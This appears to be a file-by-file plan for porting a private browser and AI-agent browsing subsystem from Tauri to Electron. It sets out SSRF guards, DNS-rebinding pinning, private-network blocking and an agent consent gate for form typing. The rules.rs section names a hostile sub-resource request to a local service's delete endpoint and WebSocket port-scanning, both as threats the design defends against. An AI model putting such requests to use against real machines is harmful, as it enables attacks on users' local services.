### `src-tauri/src/browser.rs` — 2897 LOC → electron-main (9 d)

Core private-browser engine: per-tab child WKWebView lifecycle (max 8 tabs, parked at 1x1 never closed), incognito/ephemerality verification, navigation guards (literal check + off-thread DNS recheck + halt), content-blocker attach orchestration with per-page Protection verdicts, clicked-download staging/import with oversize watcher, agent journal, and the whole evaluateJavaScript bridge (eval_json, call/call_page, ticket-based call_async, wait_ready readiness state machine).

**Replacement:** A BrowserManager class in Electron main: one WebContentsView per tab on the BaseWindow, session.fromPartition(uniquePerSitting) WITHOUT the 'persist:' prefix (in-memory); verify ephemerality against the live session (in-memory sessions report no storagePath) instead of trusting the flag. did-start-navigation (has isMainFrame) + will-navigate for the guard, setWindowOpenHandler(()=>({action:'deny'})) + navigate for popups, session.on('will-download') with DownloadItem.setSavePath/on('updated')/cancel() for downloads. executeJavaScript replaces the entire ticket bridge for async ops.

**Must preserve:**
- Three invariants (module doc): web persists NOTHING; everything the AGENT does is journaled into the room DB (the only copy — no in-memory mirror, it outlived locked rooms); the browser is never a path to this Mac (same literal guard as fetch_page on every top-level navigation, private-range rules for sub-resources, DNS recheck for names).
- Ephemerality is VERIFIED against every live webview (verify_ephemeral), not asserted from the incognito flag — the failure mode (custom config silently reverting to the persistent store) is silent.
- Page URL/title are RECORDED, never read back from the webview (wry's url() unwraps nil on an uncommitted document → SIGABRT; pinned by a source-scan test). Sub-frame navigations must not overwrite the record (believable_for/same_site: active page always believed, background page only same-site) or pages 'vanish'/get mislabeled.
- THE BLOCKER RACE: every new page starts parked on about:blank, the rule list is attached to THAT page by id (not 'the active webview'), and only then navigates (ThenGo::Navigate); an address typed during compile re-routes through the attach; should_go_after_rules prevents a stale deferred navigation snapping the page back; every attach exit funnels through settle() (verdict recorded + deferral cleared) with a 20s DEFER_GRACE backstop for WebKit dropping the completion block.
- Protection is per-page, worst-page-wins, Unknown outranks Active ('a page nobody has heard back about is not protected'), never shown as protected before the compile answers; retry re-attaches to ALL pages without moving them.
- call_async: a lost ticket is only an error if the SAME document is still up (doc_id comparison); against a new document it reports 'navigated' with a fresh snapshot — never 'completed' (later batch steps did not run) and never a failure (the click worked). Every hop addresses the page the op STARTED on, not whatever tab is now active.
- wait_ready/readiness: Loading vs Refused (document complete + no script = PDF/strict CSP → SCRIPT_REFUSED immediately, deliberately worded to stop model retries, no full budget burned); EVAL_TIMED_OUT (busy JS thread) and EVAL_LOST (navigation ate the callback) both read as Loading, not refusal; mark_superseded stamps the outgoing document so the probe can't succeed against the page being left.
- Downloads: staged in app temp (macOS Finished event reports no path), keyed by URL with duplicate-URL refusal (two slots under one key = importing a half-written file), oversize warned mid-flight by stat-polling every 2s (tauri has no progress/cancel API — the watcher says so truthfully: 'nothing here can stop a download'), imported into the room off the main thread, staging dir swept on close.
- download_allowed re-runs the URL guard because wry decides '.Download' BEFORE the navigation policy hook — an <a download> click is the one navigation on_navigation never sees.
- App-link schemes (mailto/tel/sms/...) are refused QUIETLY as 'opens another app' — not journaled as a security block; file:/data:/javascript: keep the loud path.
- close() destroys all pages, clears session id + takeover + downloads and sweeps staging — the sitting's journal id (wall-clock + counter, unique across app runs) ends with the last page.
- Tab heir rule on close: right neighbour then left; MAX_TABS refuses the 9th page rather than silently closing one.

**Gotchas:**
- Do not port the ticket bridge, EVAL_LOST taxonomy, superseded-mark, or NO_POPUPS_JS wholesale — Electron's executeJavaScript awaits promises/rejects on throw, setWindowOpenHandler and isMainFrame exist; port the BEHAVIORS (truthful navigation-vs-failure reporting) not the mechanism.
- Electron in-memory sessions still share some on-disk app-global caches (GPU/shader); 'keeps nothing' needs re-verification and an honest verify equivalent, not a copied assertion.
- The journal writes through the room DB (db::insert_browse_journal) and tolerates no-room-open; journal() is called from quit/download callbacks where state may be unmanaged (try_state) — replicate the tolerance.
- browser-* event names and TabInfo/Protection serde shapes ({state:'active'|'failed'|...} camelCase tagged enum) are frontend API contract via src/api.ts.
- The 1x1 PARKED rect doubles as 'never measured' — callers must treat both the same; bounds are logical/CSS px (WebContentsView.setBounds is DIP too, matches).
- A source-scan unit test bans get_webview_window and .url() crate-wide — the underlying traps disappear with Tauri but the test files will need retiring deliberately, not silently.

**Native/Tauri surface:** tauri WebviewBuilder.add_child/incognito/initialization_script_for_all_frames/on_navigation/on_download; Webview::eval_with_callback/navigate/close/with_webview; objc2_web_kit WKContentRuleListStore/WKContentRuleList/WKWebView.configuration().userContentController()/websiteDataStore().isPersistent(); block2::RcBlock completion handlers; tauri::Emitter events (browser-blocked/-download/-download-oversize/-journal)

### `src-tauri/src/commands/browse.rs` — 1699 LOC → electron-main (6 d)

The six browse_* agent tools (specs, dispatch, formatting) plus 16 browser chrome commands: token-terse snapshot/read/act formatters, the OUTBOUND CONSENT DOOR (agent typing room content into web forms), takeover gate, web-enabled gate, classify_browse_open privacy seam (mask searches / refuse tainted URLs), browse_look screenshot pipeline with scale-note math, and the browser_info poll that reconciles page truth with recorded state.

**Replacement:** IPC handlers (ipcMain.handle) + a browseTool executor module in Electron main. Formatters, consent door, classify logic port line-for-line to TS; look pipeline uses webContents.capturePage + sharp for downscale; browser_info poll can largely become event-driven (page-title-updated, did-navigate) pushed to the renderer instead of 1200ms polling.

**Must preserve:**
- Tool surface is deliberately SIX tools (token cost is re-sent every model turn; ref'd snapshots run 200-400 tokens vs 3-5k raw DOM — on a local 4B that is working vs context-shifting into fabrication). Specs advertised only while the browser area is open.
- OUTBOUND DOOR: before ANY action in a batch runs, every type-action's text is checked against the room's entity map (ONE matcher for gate and display — Unicode lowercase folding, not ASCII; a case-accented name once bypassed it); consent card shows REAL values (never silent masking); NO entity map at all still asks (empty hits = 'nothing to check against' is not 'safe'); refusal messages never fabricate a reason. Journal rows before and after consent.
- classify_browse_open (PRIV-4): searches get masked + a disclosure note; URLs carrying protected names are REFUSED (a masked URL only 404s — refusing is the honest move); plain words route to the room's seven engines with the results page emitted so the user WATCHES the agent search.
- require_web_enabled gates the address bar too, not just the agent (catalog gating covers the model; the user typing a URL in an 'offline' room was a false privacy claim); browser_go: back/forward/reload re-check the gate, stop never does.
- check_takeover refuses agent tools truthfully while the user drives — never queues.
- browse_do: batch cut short by navigation reports 'later actions did NOT run' + fresh snapshot (never 'done'); failed actions attach the annotated screenshot in the SAME result via perceive_image (text-only engines get a local vision model's description, never raw pixels + a lie).
- look_png paints badges, screenshots, and un-paints on EVERY path (an early return once left pink numbered outlines on the user's page); png_too_small_to_see refuses <64px captures with instructions (parked webview yields a valid 2px PNG — describing it would be fabrication); scale_note tells the model to divide picture coords by the measured backing ratio before click_at (CSS px), only when plausible (0.95-4.05x).
- uncapturable_media_note: composited video/WebGL areas are BLANK in snapshots — the caveat rides the result so models don't describe playing video as 'nothing there'.
- browser_info: writes the main frame's own url/title back to the record (self-heal); mid-navigation (blocker deferral OR an eval callback lost to navigation) reports ready:false with NO error — both a success (describes the outgoing document) and a failure (interrupted round trip) are non-news; the record's URL is served while deferred (never flash about:blank); error field present only when there is one; leaveRequested and hasSelection ride the poll.
- Empty formatted snapshot/read gets a floor sentence ('could not be described... call browse_look') — an empty tool result reads as 'nothing here' to the model.
- Every failing browse tool writes a journal 'error' row — the user can't inspect the model transcript.
- browser_clear_journal clears the journal AND the web cache (searched words + page text + thumbnails) — a Clear that left those was a Clear that did not clear; browser_clear_scope reports the counts first.

**Gotchas:**
- Cross-subsystem tendrils: remote_seam_redactor/is_protectable/mask_outbound_web/outbound_url_hides (privacy), perceive_image/ToolEffects (agent), room_mcp::scoped_specs (MCP catalog), turn::step_for (chat), db web-cache tables — the rewrite of this file cannot land before those seams have TS/sidecar homes.
- typed_text_of must mirror page.js String() coercion (numbers, booleans, arrays join with commas) — a door that only recognizes strings lets account numbers through.
- READY_BUDGET(25s)/READY_BUDGET_OPEN(12s)/ACT_BUDGET(45s)/SETTLE_BUDGET(20s) are tuned against live QA loops; keep as named constants.
- The exact refusal/instruction wording is functional (worded to stop model retry loops) — treat strings as spec.
- browser_info's 'two waits' logic (blocker deferral AND ordinary navigation) fixed the most-seen launch banner bug; if the rewrite goes event-driven, both cases must still render as 'loading', never 'not answering'.

**Native/Tauri surface:** tauri::command x16; tauri::Emitter (browser-searched/-navigated); State<AppState>/AgentUi request_ui consent round trip; crate::snapshot::capture_png via spawn_blocking

### `src-tauri/src/browser/page.js` — 1539 LOC → renderer (3 d)

The agent's page script, injected at document start into every frame of every browsed page: ref-numbered interactive-element snapshots (MARK_CAP 80, WeakRef registry, password fields fenced), readable-text extraction with UTF-16 offsets, find, action batches (click/type/select/scroll/key/click_at/back/wait_for) with per-step settle, badge annotation for screenshots, selection capture, double-Escape leave latch, mediaAreas counter, and the begin/take ticket protocol plus DOC_ID document identity.

**Replacement:** Port near-verbatim as the preload script of the browser WebContentsView (contextIsolation on, exposed via a private bridge). Keep snapshot/read/find/act/capture/info and the driver.ts mark vocabulary; DELETE the begin/take ticket machinery and DOC_ID plumbing (async ops return real promises to executeJavaScript; navigation loss surfaces as a rejected promise + did-navigate event); replace the Escape-latch info-poll ride-along with a real ipcRenderer push.

**Must preserve:**
- Deliberate port of src/agent/driver.ts — same mark vocabulary, visibility rules, staleness invariant, honest-overflow reporting, so browsing skill == app-driving skill; keep them aligned.
- Every entry point is TOTAL (never throws) — in the current transport an exception is indistinguishable from undefined; with Electron this becomes 'always returns a structured {ok,error}' as an API contract for the model, still worth keeping.
- Password/secret fields are never listed in snapshots (isSecret/valueIsPrivate fencing) — the user types those.
- read() slices in UTF-16 code units and reports nextOffset in ITS OWN units (Rust recounting in chars drifted on emoji and re-served text).
- Capture caps: 4MB markup / 800KB text with a truncated flag callers must propagate; 'Nothing is selected on the page.' is a load-bearing exact string (reader.rs converts it to an empty answer).
- mediaAreas counts >=64px video/canvas rects in-viewport so screenshots can disclose blank composited layers.
- Double-Escape (700ms chord, read-and-clear latch) is the keyboard's only way out of the native view — becomes a direct IPC send in Electron but the chord and once-only semantics stay.
- snapshot numbering and drawn badges are ONE coordinate system shared with browse_look.

**Gotchas:**
- Node test harness exists (e2e/page-script/page.test.mjs + dom-stub.mjs, plus address/browserPages/browserScope suites) — port the tests with the script; they encode the QA history.
- Injected into HOSTILE pages: keep the total-function discipline and don't leak the bridge to page JS (Electron preload with contextIsolation gives real isolation the current design never had — page code can currently see and stomp __arcelleBrowse).
- Sub-frames each run their own copy; only the main frame is polled today — with webFrameMain you can address frames properly, but keep cross-origin frame opacity reporting honest.
- act() coerces type text with String() — the consent door's typed_text_of mirrors that coercion exactly (numbers/arrays); keep the pair in lockstep.

**Native/Tauri surface:** window.__arcelleBrowse global; WKUserScript document-start all-frames injection (via tauri initialization_script_for_all_frames)

### `src-tauri/src/web/fetch.rs` — 977 LOC → electron-main (4 d)

The guarded HTTP stack: guarded_get (per-hop literal check + resolve-ALL-addresses + connection pinned to the checked addr, redirects followed BY HAND, max 5), body caps (8MiB page / 256KB preview head / 200KB preview image) with streaming enforcement, charset decoding (windows-1255 Hebrew legacy), fetch_page/fetch_readable/fetch_preview/fetch_image, safe_file_name + Content-Disposition parsing, download_to_temp (streamed, capped 900MB, cancellable, progress), YouTube caption-track scraping to timestamped transcripts, and a small meta/og scanner.

**Replacement:** TS on undici: an Agent whose connect.lookup is pinned per request to the pre-checked address, redirect:'manual' with a hand-rolled hop loop re-running the guard (identical structure); TextDecoder/iconv-lite via whatwg encoding labels for charsets; streams with byte caps; the caption scraper and meta scanner port as string-walking functions with their test tables.

**Must preserve:**
- SEC-5 pinning closes check-vs-fetch DNS rebinding: reqwest's redirect policy was the WRONG SHAPE (it re-resolved approved hops unpinned — a hostile server could answer the check publicly and the connection privately), hence manual redirect following where EVERY hop gets literal check + resolve-all + pin. This exact structure must survive the port.
- Body caps are enforced while STREAMING (a hostile server without Content-Length must not buffer gigabytes); truncate vs error is per-caller; preview reads stop at 256KB (8 results x 8MiB was 64MB of bandwidth for four head tags), images at 200KB with their OWN error string (page-sized errors explain nothing about a thumbnail).
- MAX_PAGE_CHARS=200k exists because 12k silently disabled the 40k-window pagination protocol upstream (end<total was unreachable).
- decode_body honors Content-Type charset (legacy Hebrew pages) with lossy-UTF8 fallback.
- fetch_page rejects non-textual content types; FetchedPage carries final_url so a silent redirect is visible to the model (D2).
- fetch_readable = same Readability pass as browser Save (one reading for a page however it enters the room), un-truncated for chunking, plus raw bytes for the verbatim offline copy.
- download_to_temp: reject declared-oversize early, stream to .part-style staged file, cancel polled per chunk, TooLarge is an OUTCOME not an error, name from Content-Disposition (filename*= and filename=) then URL, safe_file_name sanitizes to 80 chars with 'download' floor ('..' and '///' must not become path components); mime from header unless octet-stream, else guessed from extension.
- YouTube transcripts: string/escape-aware slicing of captionTracks out of watch-page JS soup (never a regex), manual captions preferred over asr, timedtext json3 to '[m:ss] line' matching the on-device STT timestamp contract, aAppend duplicate events skipped.
- meta_content/attr_value/icon_href handle both quote styles (single-quoted pages silently lost their og:image once); entities decoded by the ONE shared decoder (a private replace-chain once double-decoded &amp;lt;); og:image absolutized and refused unless plain http(s) (data:/javascript: must never reach the fetcher); /favicon.ico fallback always tried.

**Gotchas:**
- undici's connect.lookup pins per-HOST not per-request; build a fresh short-lived Agent per hop exactly as fetch_client builds a fresh reqwest client — do NOT reuse a pooled global agent or the pin leaks across hosts.
- Node fetch follows redirects by default — redirect:'manual' everywhere or the guard is bypassed on hop one.
- youtube_video_id's shape table (watch/shorts/embed/live/youtu.be, id charset+length) and all the parser test tables in this file are regression armor — port them verbatim.
- MAX_DOWNLOAD_BYTES=900MB is an OWNER decision (cap stays 800MB per memory note vs 900 in code — the code is 900*1024*1024; do not 'fix' either direction without the owner).
- fetch_readable depends on extraction::read_page — same cross-subsystem coordination as saved.rs.

**Native/Tauri surface:** reqwest Client::resolve (DNS pin) / redirect::Policy::none; tokio streams

### `src-tauri/src/commands/ytdlp.rs` — 949 LOC → electron-main (3 d)

Media downloads via a NOT-bundled yt-dlp standalone binary: first-use fetch (Mach-O magic sniff, size floor/ceiling, .part+rename, single-flight), >14-day staleness self-update (-U with 180s budget, mtime touch), format_selector honoring a system ffmpeg (h264-first merge chains, user height cap leading with unconstrained fallbacks), list_media_formats quality picker (honest sizes, fits flag), download_media_to_temp (progress-line parsing, first-line oversize abort, 250ms cancel/budget polling, concurrent stderr drain), import_youtube_video/import_media_url commands, cancel_media_download.

**Replacement:** TS port spawning the SAME standalone yt-dlp_macos binary via child_process (readline over stdout/stderr replaces the tokio line loops; AbortController + kill for cancel). Keep the binary-download + self-update logic exactly (do NOT pip-bundle yt-dlp into the PyInstaller sidecar — it would freeze to app release cadence and the monthly YouTube 403 wave returns). ffmpeg discovery and all parsers port as pure functions with their test tables.

**Must preserve:**
- Self-update doctrine: YouTube rotates its player scheme ~monthly; a binary >14d old runs -U before use (best-effort — offline/over-budget keeps the old binary and the download fails truthfully); 'already up to date' still touches mtime or the check re-runs every download; the install guard doubles as the update guard.
- Fetched binary safety: no published digest exists ('latest' URL), so refuse anything that is not Mach-O/FAT magic, under 1MB, or over 200MB — the realistic attack is a captive-portal HTML page chmod +x'd; every rejection removes the .part.
- format_selector: merge (+) branches offered EXACTLY when ffmpeg exists (without it yt-dlp leaves two unmerged files; with it withheld, downloadable videos fail); h264/avc1 preferred because AVFoundation can't decode the VP9 plain-best picks; pre-muxed mp4 always first; OWNER CALL 2026-08-22: quality is NEVER auto-downgraded to fit the size cap — resolution is the user's pick (max_height) with unconstrained fallbacks so a vanished quality degrades to best-available, never errors.
- First-progress-line oversize abort: yt-dlp announces 'of ~871.20MiB' up front — a video over MAX_DOWNLOAD_BYTES is refused in its first second, not after an hour; fragment/retry counters ('1 of 100') must never false-positive as sizes.
- Cancel is armed (cleared) at each download START so a stale Stop can't kill the next one; Stop + the 1h budget are polled on a 250ms timer so a SILENT stalled downloader still honors them; stderr drained concurrently (a noisy downloader once filled the 64KB pipe and deadlocked both sides).
- quality_options: without ffmpeg only pre-muxed heights are offered (a chip the downloader can't honor is a lie); size estimates mirror the actual pick (h264 + largest audio, erring never-under); unknown size is offered as fitting ('refusing on a guess would be a false claim').
- explain_download_failure: only the one user-fixable failure (split-stream + no ffmpeg) gets advice ('brew install ffmpeg'); everything else keeps yt-dlp's own words.
- SSRF posture D16: yt-dlp does its own networking so the guard cannot pin it — pre-flight literal check + DNS resolve only, residual redirect risk documented and accepted.
- ffmpeg is NEVER bundled (signing/notarization doctrine) — Homebrew/MacPorts paths probed explicitly because a GUI app's PATH is bare.
- Both import commands gate on require_web_access before fetching anything; import goes through import_download (preview + background transcription + origin_url just happen); work dir always swept.

**Gotchas:**
- The progress/size/selector parsers carry seven test blocks encoding real yt-dlp output quirks ('of ~ 871.20MiB' with and without space, KiB/GiB, HLS estimates) — port tests first.
- Electron app.getPath('userData')/bin replaces app_data_dir; keep the binary OUTSIDE any room.
- child_process kill() does not kill the ffmpeg grandchild on merge — use detached+process-group kill or yt-dlp's own cleanup; verify Stop mid-merge leaves no orphan ffmpeg.
- MEDIA_CANCEL is process-global by design (exactly one interactive download); the agent job path passes its own flag — keep both channels.

**Native/Tauri surface:** tauri::command x4; tokio::process::Command kill_on_drop; tauri app_data_dir; ytdlp-progress events

### `src-tauri/src/browser/rules.rs` — 656 LOC → electron-main (1.5 d)

Generates the Apple content-blocker JSON WebKit compiles: ~90 curated tracker/ad domains (third-party loads blocked, 2 url-filter patterns per domain) plus the security-critical private-network sub-resource rules (every RFC1918/CGNAT/link-local/multicast/IPv6-local family over http(s) AND ws(s)), all written in the tiny regex subset WKContentRuleList's DFA compiler accepts.

**Replacement:** @ghostery/adblocker-electron (full EasyList, replaces the curated tracker table) plus a small custom session.webRequest.onBeforeRequest handler for the private-range policy that calls the SAME host-classification code as the fetch guard (one shared TS module instead of two parallel encodings). Chromium's webRequest sees every sub-resource including WebSocket connects.

**Must preserve:**
- Private-range blocking exists because navigation hooks never see SUB-RESOURCES: an <img src=http://localhost:11434/api/delete> must die at the network layer before leaving the machine.
- ws:// and wss:// are covered explicitly — otherwise page script can port-scan this Mac by timing WebSocket failures.
- The rules MUST stay in exact parity with check_public_http_url (a test asserts every guard-blocked family has a rule); in the rewrite this becomes literal code sharing, which is the whole win.
- Blocklist stays local — Arcelle never phones home for a filter list (ghostery adblocker must be configured to use its BUNDLED engine, not fetch remote lists, or this owner decision is violated).

**Gotchas:**
- The two legendary traps — WebKit rejecting the WHOLE list for one out-of-subset regex as silent 'WKErrorDomain error 6', and RULE_LIST_ID cache-key bumping (with the FNV digest tripwire test) — both VANISH with Electron; do not recreate them, but do keep a test that the private-range blocker actually intercepts a request (the failure mode 'blocker silently not attached while the shield says Private' is engine-independent).
- webRequest-based blocking runs in the main process, not the network process — a busy main process delays requests; measure before shipping.
- load-type third-party semantics differ between WebKit rules and adblocker heuristics; the curated 'never breaks a page the user wanted' property needs a smoke test.

**Native/Tauri surface:** None directly (pure JSON generation; consumed by WKContentRuleListStore in browser.rs)

### `src-tauri/src/commands/browse/search.rs` — 604 LOC → electron-main (2.5 d)

BROWSE-3 results page backend: browser_search (shared 15-min cache with the assistant's web_search), run_search (also the agent's search path), format_hits_for_agent, browser_preview enrich pass (8 pages, 4 concurrent, images/icons as data URLs), import_search_result (+ button funnel), browser_peek (1400-char inline read), browser_search_summary (grounded 1-paragraph LLM answer with mandatory bracket citations), and the normalized cache_key.

**Replacement:** IPC handlers in Electron main: sidecar /web_search over HTTP, undici-guarded preview fetches with p-limit concurrency, data-URL encoding, Ollama call for the summary via the existing ollama client's TS successor. Cache tables stay in the room DB.

**Must preserve:**
- ONE search path: user's address bar and the agent's browse_open share the same gate, cache, and engines — 'anything else means the agent looking at a different web than the person watching it'; a search typed here makes the model's next web_search free.
- The results VIEW never makes a network request — every byte including images arrives through the Rust guard as a data URL, so no origin ever sees a browser.
- Cache hits replay with cached:true, failed:[] (stale engine failures are not news) and are NOT journaled; live searches journal 'Searched for ...' — the moment a query left this Mac.
- Agent formatting is a NEXT STEP, not an answer: 6 hits, 180-char snippets, closing instruction to browse_open then browse_read, plus 'these snippets are the engines' words, not the page's' — anti-fabrication wording is functional.
- Previews: off-switch per room (web_result_previews, absent=on) returns empty Ok — cards keep monogram tiles; every per-page failure degrades to no-preview, never fails the search; fetched page text is cached so Peek/summary cost nothing later.
- Summary: only from cached/fetched sources (max 3, 3000 chars each), model at temp 0.2, <think> spans stripped (a thinking model's monologue once rendered AS the summary), empty result is an error not a blank; expired results say to search again.
- cache_key normalizes through check_public_http_url LITERAL-only (no DNS on the cache-hit path) — engine spelling vs reqwest normalization once meant the Peek cache never hit for plain domains.
- import_search_result routes through import_web_source (YouTube captions / readable page / binary funnel) and journals.

**Gotchas:**
- summary depends on crate::ollama (model routing subsystem) and models::model_setting/KEEP_ALIVE_WARM; summaryAvailable=false when no engine is configured so the UI never shows a button that can only fail.
- BrowserSearchResult flattens SearchPage via serde(flatten) — camelCase shape is frontend contract (BrowserSearch.tsx).
- Concurrency cap (4) and MAX_PREVIEWS (8) are politeness/bandwidth decisions, not arbitrary.

**Native/Tauri surface:** tauri::command x5; futures_util join_all batching

### `src-tauri/src/commands/browse/saved.rs` — 465 LOC → electron-main (2 d)

BROWSE-2 capture_and_save: shared by agent browse_save and toolbar Save — captures the live page (or selection), runs Readability extraction off-thread, writes Title.md (searchable, metadata header, carries chunks) + Title.html (self-contained styled article, no chunks) with files.web_meta JSON, schedules auto-index + privacy scan, journals, and replies with only what actually happened.

**Replacement:** TS port in Electron main calling @mozilla/readability + linkedom (or the page's own DOM via executeJavaScript running Readability in-page) + turndown for Markdown; DB writes via the new DB layer; heavy extraction in a worker thread if parsing 4MB SPA markup stalls the main process.

**Must preserve:**
- Owner ruling: a saved page is a FULL READABLE ARTICLE with declared metadata preserved; nothing invents a field — no author declared means no author line anywhere.
- Name collision resolved BEFORE deriving the .html twin so the pair stays name-matched (available_name; repeat saves of a news front page were indistinguishable in live QA).
- No article extracted → the page's own text/verbatim capture, and the reply SAYS 'this page's text (it has no article to extract)' — never dressed up; clipped captures (4MB markup cap) are disclosed because the article is parsed from exactly that clipped markup.
- Selection saves get no extraction/metadata (capture sends no markup for selections) and a '(selection)' name suffix.
- HTML twin carries NO search chunks (indexing both would find the page twice).
- Must schedule_auto_index + schedule_privacy_scan after landing — browser-saved pages once sat unsearchable and outside the privacy scan until an unrelated import triggered one.
- web_meta write is best-effort — losing the metadata strip is not worth failing the save.
- title fallback: Readability title, else document.title, NEVER the URL (URL is its own field).

**Gotchas:**
- Depends on crate::extraction::read_page/PageMeta (owned by the parsing subsystem — per the split rule document parsing may move to the Python sidecar; decide ONE home for Readability because fetch.rs's fetch_readable uses the same pass to keep link-saved and browser-saved pages identical).
- article_document/markdown_page templates define the offline-viewer rendering contract (sandboxed viewer, zero network) — port the self-contained-HTML discipline.
- db::insert_file_from_url with origin_url and 'web' source is the files-subsystem funnel; coordinate signatures.

**Native/Tauri surface:** tauri::Emitter room-files-changed; tokio spawn_blocking for Readability scoring

### `src-tauri/src/web/search.rs` — 371 LOC → electron-main (0.5 d)

Thin client over the sidecar's /web_search fusion endpoint (the ONE search provider — 7 engines, fused ranking, no Rust scraper remains): budgets (60s vs the sidecar's 22s fan-out), limits (10 agent / 12 browser), render_hits + provenance lines for the model, join_names, tolerant parse_hits (legacy single-source fallback).

**Replacement:** A 100-line searchClient.ts calling the existing sidecar over localhost HTTP; render/provenance string builders port directly.

**Must preserve:**
- WEB_SEARCH_TIMEOUT is sized relative to the sidecar's FANOUT_BUDGET and must stay in step (it was once 4 minutes, leaving users watching a dead 'Searching...' for 218 needless seconds).
- OLLAMA_DOWN is re-worded here because this endpoint has no model in it — generation sentinels would be nonsense.
- parse_hits is tolerant by design: missing engines falls back to legacy source key so an older sidecar degrades instead of erroring; empty titles become '(untitled)'.
- provenance line ('via brave +2 more · date · relevance 0.87') is what makes the model treat results as pointers, not sources.

**Gotchas:**
- The sidecar port-discovery contract (PyInstaller onedir PRINTS its port, ignores SIDECAR_PORT) is owned by the sidecar-lifecycle subsystem — this client just needs the resolved base URL.

**Native/Tauri surface:** crate::sidecar::sidecar_json_timeout

### `src-tauri/src/commands/browse/reader.rs` — 298 LOC → electron-main (1 d)

Accessibility commands (item #18): browser_page_text (raw read op for the reading view), browser_page_selection (selection as text, 40k-char reading cap, 'nothing selected' as an empty answer not an error), browser_focus_app (hand the keyboard back from the native webview). Guards against reading a parked/1x1 page whose reflowed layout makes ok:true answers fragments.

**Replacement:** Three ipcMain handlers over the same preload read/capture ops; webContents.focus() on the app's WebContents replaces set_focus/makeFirstResponder. The bounds-settle wait (1.5s poll for a real rect) stays if the parked-at-1x1 pattern survives; if the rewrite hides views with setVisible instead of 1x1 parking, the whole too_small_to_read guard can go.

**Must preserve:**
- A page smaller than 200px in either dimension is REFUSED (PARKED_REFUSAL) — a 1px-wide viewport reflows an article to tens of thousands of px and isVisible drops most of it while still answering ok:true; the text twin of png_too_small_to_see.
- BOUNDS_SETTLE 1.5s: the reading view pushes its new rect without waiting, so the first read may race the parked rect — refusing instantly would fail the feature's main case.
- NOTHING_SELECTED exact-string contract with page.js (test pins PAGE_JS contains it); empty selection returns the same JSON shape as a real one so callers never branch on answer kind.
- SELECTION_MAX = READ_MAX = 40,000 (test pins the literal in PAGE_JS); clip on char boundaries; page's own 800KB save-cap clip also sets truncated.
- Deliberately NO web gate (reads an already-loaded page), NO takeover check (the reader IS the user), NO journal row (a person reading is not the agent — sighted eyes aren't journaled either).

**Gotchas:**
- Electron's focus model differs (webContents.focus vs first responder) but the trap is the same: a keyboard user tabbed into the guest view has no DOM route home — keep the double-Escape + focus-return pair working end to end and test it.
- The cap-parity tests grep PAGE_JS source; convert to importing shared constants.

**Native/Tauri surface:** tauri::command x3; crate::main_webview().set_focus (makeFirstResponder)

### `src-tauri/src/web/guard.rs` — 199 LOC → electron-main (1 d)

The SSRF policy core: is_public_ip (RFC1918, loopback, link-local, 0/8, CGNAT 100.64/10, 192.0.0/24, benchmarking 198.18/15, >=224, IPv6 loopback/unspecified/ULA/link-local, IPv4-mapped classified by embedded v4), check_public_http_url (literal check: scheme, localhost/.local, trailing-dot root-label normalization, bracketed IPv6), resolve_public_addr (resolve ALL, any private fails, returns pinned addr), host_resolves_private (deliberately distinct from resolve failure).

**Replacement:** One shared guard.ts: net.isIP + ipaddr.js (or hand-ported range math — it is 30 lines) for classification, URL parsing via the WHATWG URL class, dns.promises.lookup({all:true, verbatim:true}) for resolve-all. This ONE module then feeds the fetch stack, the browser navigation gate, the webRequest sub-resource blocker, and the yt-dlp pre-flight — four consumers, one policy.

**Must preserve:**
- Trailing-dot normalization: 'localhost.' and 'printer.local.' resolve identically to the undotted names and once walked straight through — and in download_allowed the literal check is the ONLY layer.
- IPv6 brackets stripped before IpAddr parse or the literal check never fires for v6; IPv4-mapped ::ffff:a.b.c.d classified by the embedded IPv4.
- resolve_public_addr fails if ANY returned address is private (a rebinding name mixing public+private answers must die).
- host_resolves_private answers a DIFFERENT question than resolve_public_addr: an unresolvable name just fails to load — reporting it as a private-address block is a false red banner + false journal line; false on lookup failure ('could not find out' is not 'yes').
- The removed hop_host_is_public is documented in place as a WARNING: any redirect check that cannot PIN the connection it approved is a rebinding hole.

**Gotchas:**
- WHATWG URL normalizes differently than reqwest::Url in corner cases (e.g. default-port stripping, trailing dots) — re-run the whole test table (three test blocks in this file) against the TS port before trusting cache_key equality and guard behavior.
- Node's dns.lookup uses getaddrinfo (same as Rust) — keep it, do NOT switch to dns.resolve (bypasses /etc/hosts, changing semantics).

**Native/Tauri surface:** tokio::net::lookup_host

### `src-tauri/src/commands/browse/address.rs` — 189 LOC → renderer (0.5 d)

URL-or-search classifier shared conceptually with the TypeScript twin in src/workspace/address.ts: ?-prefix forces search, explicit scheme forces URL, any whitespace is a search, hostish/IPv4/host:port navigate with https filled in, bare words search. Classifying is not permitting — Url verdicts still clear browse_guard_url.

**Replacement:** DELETE the duplicate: use the existing src/workspace/address.ts as the single implementation, imported by both the address bar and the Electron-main browse_open handler (main can import the same module). Merge the Rust test case table into the TS test file.

**Must preserve:**
- Space rule fires BEFORE host rule ('who wrote hamlet.txt' searches; 'best pizza nyc' no longer becomes https://best%20pizza%20nyc).
- 2-char TLD floor keeps 'node.j' a topic; ?-prefix is the escape hatch for host-shaped searches.
- localhost:3000 and 192.168.1.1 classify as URLs on purpose — the GUARD refuses them by name with an honest message.
- The Rust and TS case tables are deliberately identical — the twin-test discipline becomes moot once there is one module.

**Gotchas:**
- The unification is the point — porting this file as a second TS copy would preserve the drift risk the twin tests exist to catch.

**Native/Tauri surface:** None

### `src-tauri/src/snapshot.rs` — 141 LOC → electron-builtin (0.5 d)

capture_png: whole-webview PNG capture via WKWebView takeSnapshot (NOT screen capture — no TCC permission), with a main-thread deadlock guard, completion-handler channel ferry, NSImage→TIFF→PNG conversion, 5s timeout. Serves browse_look and the agent's view_screenshot.

**Replacement:** webContents.capturePage() → NativeImage.toPNG() — a one-liner Electron built-in named in the target decision. Wrap with the same 5s timeout and honest error strings.

**Must preserve:**
- No TCC/Screen-Recording permission involved — capture must stay in-process (capturePage is; desktopCapturer is NOT — never switch).
- Hardware-composited layers (video, WebGL) render blank — the mediaAreas disclosure in browse_look depends on this remaining true (capturePage has the same Chromium limitation).
- Must not run on (or block) the main thread today; in Electron capturePage is async and safe, but the caller-side spawn_blocking wrapper in browse.rs goes away with it.
- Returns device-scale pixels — the picture_per_css scale-note math in browse.rs consumes this; NativeImage carries an explicit scaleFactor which can make that math exact instead of inferred.

**Gotchas:**
- capturePage captures the view's current bounds — a 1x1-parked view still yields a tiny valid PNG, so png_too_small_to_see (or a visibility check) must survive the rewrite.
- capturePage of an occluded/hidden WebContentsView can return stale or empty frames; test the parked-tab path explicitly.

